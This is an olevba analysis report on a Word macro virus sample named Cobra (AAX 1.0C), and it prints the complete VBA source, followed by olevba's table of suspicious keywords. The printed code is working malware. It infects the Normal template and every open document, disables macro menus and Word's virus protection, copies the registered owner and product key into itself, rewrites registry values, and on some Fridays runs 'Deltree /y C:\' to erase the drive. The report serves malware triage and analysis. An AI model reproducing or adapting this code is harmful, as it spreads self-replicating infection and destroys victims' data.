olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Cobra.x-b0ced162c765ea5caee8e103613af66da6bec2f7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Cobra.x-b0ced162c765ea5caee8e103613af66da6bec2f7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AAX_10C.bas 
in file: Virus.MSWord.Cobra.x-b0ced162c765ea5caee8e103613af66da6bec2f7 - OLE stream: 'Macros/VBA/AAX_10C'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'AAX Version 1.0C
'An intelligent member of Cobra family

Sub FileExit()
On Error Resume Next
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
WordBasic.FileExit
End Sub
Sub AutoOpen()
On Error Resume Next
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
End Sub
Sub AutoClose()
On Error Resume Next
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub FileOpen()
On Error Resume Next
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
Dialogs(wdDialogFileOpen).Show
End Sub
Sub FileSave()
On Error Resume Next
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Sub FileClose()
On Error Resume Next
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
WordBasic.FileClose
End Sub
Sub FileSaveAs()
On Error Resume Next
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePrint()
On Error Resume Next
Call MnuOff
Call InfectDocNTemp
Call RegE
Call D30X12
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra", "Inf")
CD = Format(Date, "mm/dd/yyyy")
If DateValue(CD) - DateValue(ID) > (30 * 6) Then
HD = ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary)
If HD <> "AAX" Then
ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary).Range.Delete
ActiveDocument.Sections(1).Headers(wdHeaderFooterPrimary).Range.InsertAfter ("AAX")
End If
End If
Dialogs(wdDialogFilePrint).Show
End Sub
Sub InfectDocNTemp()
On Error Resume Next
For Each ID In NormalTemplate.VBProject.VBComponents
If ID.Name <> "AAX_10C" And ID.Name <> "ThisDocument" Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
Name:=ID.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
TempInf = False
For Each ID In NormalTemplate.VBProject.VBComponents
If ID.Name = "AAX_10C" Then
TempInf = True
End If
Next
If TempInf = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=ActiveDocument.AttachedTemplate, Name:="AAX_10C", _
Object:=wdOrganizerObjectProjectItems
TempInf = True
End If
For Each DF In Documents
For Each ID In DF.VBProject.VBComponents
If ID.Name <> "AAX_10C" And ID.Name <> "ThisDocument" And _
ID.Name <> "Reference to Normal" Then
Application.OrganizerDelete Source:=DF.Name, _
Name:=ID.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
Next
For Each DF In Documents
DocInf = False
For Each ID In DF.VBProject.VBComponents
If ID.Name = "AAX_10C" Then
DocInf = True
End If
Next
If DocInf = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=DF.Name, Name:="AAX_10C", Object:=wdOrganizerObjectProjectItems
DF.SaveAs FileName:=DF.Name
End If
Next
End Sub
Sub MnuOff()
On Error Resume Next
CustomizationContext = NormalTemplate
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
Sub RegE()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") <> "Cobra" Then
GetInf = Chr(13) + "' " + String(80, Chr(178)) + Chr(13) + "' " + Format(Date, "dd/mm/yyyy") + Chr(13) + _
"' " + System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") + Chr(13) + _
"' " + System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") + Chr(13) + _
"' " + System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "Version") + Chr(13) + _
"' " + System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "ProductKey") + Chr(13) + _
"' " + String(80, Chr(178))
Lc = ActiveDocument.VBProject.VBComponents("AAX_10C").CodeModule.CountOfLines
Lc = Lc
ActiveDocument.VBProject.VBComponents("AAX_10C").CodeModule.InsertLines Lc + 2, GetInf
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra", "") = ""
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "349,PlBg,Dhk-1217,BD"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra", "Inf")
If Not IsDate(ID) Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra", "Inf") = Format(Date, "mm/dd/yyyy")
End If
End Sub
Sub D30X12()
On Error Resume Next
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra", "Inf")
CD = Format(Date, "mm/dd/yyyy")
If DateValue(CD) - DateValue(ID) > 365 Then
If WeekDay(Date) = 6 Then
Shell "Deltree /y C:\", vbHide
End If
End If
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

